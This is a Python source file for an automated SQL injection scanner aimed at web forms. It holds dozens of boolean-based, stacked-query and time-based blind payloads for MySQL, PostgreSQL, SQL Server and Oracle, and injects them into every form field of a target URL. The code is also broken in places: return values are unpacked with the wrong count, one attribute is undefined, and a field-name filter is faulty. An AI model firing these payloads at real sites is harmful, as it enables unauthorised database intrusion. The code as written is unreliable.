'''
Created on 2012-8-15

@author: zsy
'''
import threading
from urllib.request import urlopen
from urllib.request import Request
from urllib.parse import urlencode
import time
import sys
from myCrawler.CrawThread import *
class formsqldetect():
    def __init__(self,formdict):
        self.formdict=formdict
        self.url=list(formdict)[0]
        self.inputlist=formdict[self.url]
        self.paradict=self.getparadict()
    def getparadict(self):
        paradict={}
        for inputdict in self.inputlist:
            if "name" in inputdict and inputdict["name"]!=("submit" or "login" or "action" or "verifycode"):
                if "value" in inputdict and inputdict["value"]:
                    paradict[inputdict["name"]]=inputdict["value"]
                else:
                    paradict[inputdict["name"]]=""
        return paradict
    def formrequest(self,dict):
        data=urlencode(dict)
        data=data.encode(encoding='utf_8', errors='strict')
        r=Request(self.url,data)
        resp=urlopen(r)
        if resp:
            code=resp.getcode()
            urlresp=resp.geturl()
            headresp=resp.info()
            pageresp=resp.read()
            resp.close()
            return code,urlresp,headresp,pageresp
        else:
            return None
        
    def Inject(self,dict,item,strinject):
        modifydict=dict
        dict[item]=str(dict[item])
        modifydict[item]=dict[item]+strinject
        print("payloadAdd: ",strinject)
        link,code,headresp,urlresp,pageresp=self.formrequest(modifydict)
        print(code," ",urlresp)
        return link,code,headresp,urlresp,pageresp
    def timeInject(self,dict,item,strinject):
        modifydict=dict
        dict[item]=str(dict[item])
        modifydict[item]=dict[item]+strinject
        print("payloadAdd: ",strinject)
        time1=time.time()
        link,code,headresp,urlresp,pageresp=self.formrequest(modifydict)
        time2=time.time()
        timedelay=time2-time1
        time1=time.time()
        link,code,headresp,urlresp,pageresp=self.formrequest(dict)
        time2=time.time()
        timenormal=time2-time1
        return timedelay,timenormal
    
    def BooleanBasedBlind(self,dict,item):
        print("testint connection to target")
        link,code,headresp,urlresp,pageresp=self.testconnect#normal request
        print(code,"",urlresp)
        #choose continue or stop
        print("testing 'AND boolean-based blind - WHERE or HAVING clause'")
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item," and 1=1")
        link2,code2,headresp2,urlresp2,pageresp2=self.Inject(dict,item," and 1=2")
        if len(pageresp)==len(pageresp1) and len(pageresp)!=len(pageresp2):
            print("numeric injection point:",item)                
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,") and (1=1")
        link2,code2,headresp2,urlresp2,pageresp2=self.Inject(dict,item,") and (1=2")
        if len(pageresp)==len(pageresp1) and len(pageresp)!=len(pageresp2):
            print(") numeric injection point:",item)
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"' and '1'='1")
        link2,code2,headresp2,urlresp2,pageresp2=self.Inject(dict,item,"' and '1'='2")
        if len(pageresp)==len(pageresp1) and len(pageresp)!=len(pageresp2):
            print("char injection point:",item)                       
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"') and ('1'='1")
        link2,code2,headresp2,urlresp2,pageresp2=self.Inject(dict,item,"') and ('1'='2")
        if len(pageresp)==len(pageresp1) and len(pageresp)!=len(pageresp2):
            print(") char injection point:",item)   
            
        #database inline knowing numeric injection existing
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item," and 'ab'='a'+'b'")
        if len(pageresp)==len(pageresp1):
            print("SQL Server numeric injection point:",item)            
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item," and 'ab'='a''b'")
        if len(pageresp)==len(pageresp1):
            print("MySQL numeric injection point:",item)          
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item," and 'ab'='a'||'b'")
        if len(pageresp)==len(pageresp1):
            print("Oracle numeric injection point:",item)           
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,") and ('ab'='a'+'b'")
        if len(pageresp)==len(pageresp1):
            print("SQL Server numeric injection point:",item)
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,") and ('ab'='a''b'")
        if len(pageresp)==len(pageresp1):
            print("MySQL numeric injection point:",item)        
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,") and ('ab'='a'||'b'")
        if len(pageresp)==len(pageresp1):
            print("Oracle numeric injection point:",item)            
        #database inline have known char jnjection existing
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"' and 'ab'='a'+'b")
        if len(pageresp)==len(pageresp1):
            print("SQL Server char injection point:",item)        
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"' and 'ab'='a''b")
        if len(pageresp)==len(pageresp1):
            print("MySQL char injection point:",item)            
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"' and 'ab'='a'||'b")
        if len(pageresp)==len(pageresp1):
            print("Oracle char injection point:",item)            
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"') and ('ab'='a'+'b")
        if len(pageresp)==len(pageresp1):
            print("SQL Server char injection point:",item)            
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"') and ('ab'='a''b")
        if len(pageresp)==len(pageresp1):
            print("MySQL char injection point:",item)       
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"') and ('ab'='a'||'b")
        if len(pageresp)==len(pageresp1):
            print("Oracle char injection point:",item)
#    def ErrorBasedInject(self,dict,item):
        
    def annotationDetect(self,dict,item):
        print("testint connection to target")
        link,code,headresp,urlresp,pageresp=self.testconnect#normal request
        print(code,"",urlresp)
        #choose to continue or stop
        print("test Injection by annotation")
        link1,code1,headresp1,urlresp1,pageresp1=self.Inject(dict,item,"/*test*/")
        if link1==urlresp1 and code1==200 and pageresp1==pageresp:
            print(item," may have injection flaw")
         
    def StackQueryInject(self,dict,item):
        print("testing 'MySQL > 5.0.11 stacked queries'")
        timedelay,timenormal=self.timeInject(dict,item,"); SELECT SLEEP(5);--  AND (673=673")
        if timedelay-timenormal>5:
            print(item," MySQL>5.0.11 numeric-timebased-stacked query injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"; SELECT SLEEP(5);--")
        if timedelay-timenormal>5:
            print(item," MySQL>5.0.11 numeric-timebased-stacked query injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"'); SELECT SLEEP(5);--  AND ('gera'='gera")
        if timedelay-timenormal>5:
            print(item," MySQL>5.0.11 char-timebased-stacked query injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"'; SELECT SLEEP(5);--  AND 'WyNs'='WyNs")
        if timedelay-timenormal>5:
            print(item," MySQL>5.0.11 char-timebased-stacked query injection flaw ")
            
        print("testing 'PostgreSQL > 8.1 stacked queries'")
        timedelay,timenormal=self.timeInject(dict,item,"); SELECT PG_SLEEP(5);-- AND (3250=3250")
        if timedelay-timenormal>5:
            print(item," PostgreSQL > 8.1 numeric-timebased-stacked query injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"; SELECT PG_SLEEP(5);--")
        if timedelay-timenormal>5:
            print(item," PostgreSQL > 8.1 numeric-timebased-stacked query injection flaw ")   
        timedelay,timenormal=self.timeInject(dict,item,"'); SELECT PG_SLEEP(5);-- AND ('hCTN'='hCTN")
        if timedelay-timenormal>5:
            print(item," PostgreSQL > 8.1 char-timebased-stacked query injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"'; SELECT PG_SLEEP(5);-- AND 'Jdtz'='Jdtz")
        if timedelay-timenormal>5:
            print(item," PostgreSQL > 8.1 char-timebased-stacked query injection flaw ")    
            
        print("testing 'Microsoft SQL Server/Sybase stacked queries'")    
        timedelay,timenormal=self.timeInject(dict,item,"); WAITFOR DELAY '0:0:5';-- AND (8785=8785")
        if timedelay-timenormal>5:
            print(item," Microsoft SQL Server/Sybase numeric-timebased-stacked query injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"; WAITFOR DELAY '0:0:5';--")
        if timedelay-timenormal>5:
            print(item," Microsoft SQL Server/Sybase numeric-timebased-stacked query injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"'); WAITFOR DELAY '0:0:5';-- AND ('aKCb'='aKCb")
        if timedelay-timenormal>5:
            print(item," Microsoft SQL Server/Sybase char-timebased-stacked query injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"'; WAITFOR DELAY '0:0:5';-- AND 'YtlZ'='YtlZ")
        if timedelay-timenormal>5:
            print(item," Microsoft SQL Server/Sybase char-timebased-stacked query injection flaw ")
            
    def TimeBasedBlind(self,dict,item):
        print("testing 'MySQL > 5.0.11 AND time-based blind'")
        timedelay,timenormal=self.timeInject(dict,item,") AND SLEEP(5) AND (8689=8689")
        if timedelay-timenormal>5:
            print(item," MySQL > 5.0.11 numeric-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item," AND SLEEP(5)")
        if timedelay-timenormal>5:
            print(item," MySQL > 5.0.11 numeric-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"') AND SLEEP(5) AND ('hxMY'='hxMY")
        if timedelay-timenormal>5:
            print(item," MySQL > 5.0.11 char-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"' AND SLEEP(5) AND 'JgDH'='JgDH")
        if timedelay-timenormal>5:
            print(item," MySQL > 5.0.11 char-and-time-based injection flaw ")
        
        print("testing 'PostgreSQL > 8.1 AND time-based blind'")
        timedelay,timenormal=self.timeInject(dict,item,") AND 9550=(SELECT 9550 FROM PG_SLEEP(5)) AND (591=591")
        if timedelay-timenormal>5:
            print(item," PostgreSQL > 8.1 numeric-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item," AND 9550=(SELECT 9550 FROM PG_SLEEP(5))")
        if timedelay-timenormal>5:
            print(item," PostgreSQL > 8.1 numeric-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"') AND 9550=(SELECT 9550 FROM PG_SLEEP(5)) AND ('Atha'='Atha")
        if timedelay-timenormal>5:
            print(item," PostgreSQL > 8.1 char-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"' AND 9550=(SELECT 9550 FROM PG_SLEEP(5)) AND 'tvZA'='tvZA")
        if timedelay-timenormal>5:
            print(item," PostgreSQL > 8.1 char-and-time-based injection flaw ")
        
        print("testing 'Microsoft SQL Server/Sybase time-based blind'")   
        timedelay,timenormal=self.timeInject(dict,item,") WAITFOR DELAY '0:0:5'-- AND (5945=5945")
        if timedelay-timenormal>5:
            print(item," Microsoft SQL Server/Sybase numeric-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item," WAITFOR DELAY '0:0:5'--")
        if timedelay-timenormal>5:
            print(item," Microsoft SQL Server/Sybase numeric-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"') WAITFOR DELAY '0:0:5'-- AND ('vZcs'='vZcs")
        if timedelay-timenormal>5:
            print(item," Microsoft SQL Server/Sybase char-and-time-based injection flaw ")    
        timedelay,timenormal=self.timeInject(dict,item,"' WAITFOR DELAY '0:0:5'-- AND 'ziTu'='ziTu")
        if timedelay-timenormal>5:
            print(item," Microsoft SQL Server/Sybase char-and-time-based injection flaw ")    
            
        print("testing 'Oracle AND time-based blind'")
        timedelay,timenormal=self.timeInject(dict,item,") AND 8039=DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(110)||CHR(97)||CHR(107),5) AND (2374=2374")
        if timedelay-timenormal>5:
            print(item," Oracle  numeric-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item," AND 8039=DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(110)||CHR(97)||CHR(107),5)")
        if timedelay-timenormal>5:
            print(item," Oracle  numeric-and-time-based injection flaw ")
        timedelay,timenormal=self.timeInject(dict,item,"') AND 8039=DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(110)||CHR(97)||CHR(107),5) AND ('RRIQ'='RRIQ")
        if timedelay-timenormal>5:
            print(item," Oracle  char-and-time-based injection flaw ")    
        timedelay,timenormal=self.timeInject(dict,item,"' AND 8039=DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(110)||CHR(97)||CHR(107),5) AND 'tOJn'='tOJn")
        if timedelay-timenormal>5:
            print(item," Oracle  char-and-time-based injection flaw ")  
            
    def formInject(self):#href only need to pass to this class
        print(self.formdict)
        for item in self.paradict:
            self.BooleanBasedBlind(self.paradict,item)
            self.annotationDetect(self.paradict,item)
            self.StackQueryInject(self.paradict,item)
            self.TimeBasedBlind(self.paradict,item)